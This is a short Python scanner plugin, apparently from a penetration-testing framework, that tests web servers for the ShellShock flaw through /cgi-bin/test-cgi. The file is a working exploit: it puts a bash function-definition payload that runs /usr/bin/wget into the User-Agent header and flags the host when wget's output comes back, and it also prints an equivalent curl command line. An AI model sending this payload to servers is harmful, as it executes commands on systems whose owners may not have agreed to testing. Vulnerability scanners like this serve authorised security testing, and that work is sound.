# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):

    url = '%s://%s:%s/cgi-bin/test-cgi' % (service, ip, port)
    payload = '''() { foo;}; echo Content-Type: text/plain ; echo ; /usr/bin/wget'''

    try:
        r = await http_client(ip, port).get(url, headers={"User-Agent": payload}, timeout=20)

        if "ry `wget --help' for more options" in r.text:
            ret = {
                'alert_group': 'ShellShock Remote Code Execution',
                'affects':  url,
                'details': "Shell Shock: curl -A '%s' %s" % (payload, url) +
                           ' \n\nExec ifconfig, found header [inet addr]'
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'http', True, task_msg={})
    run_plugin_test(scan)
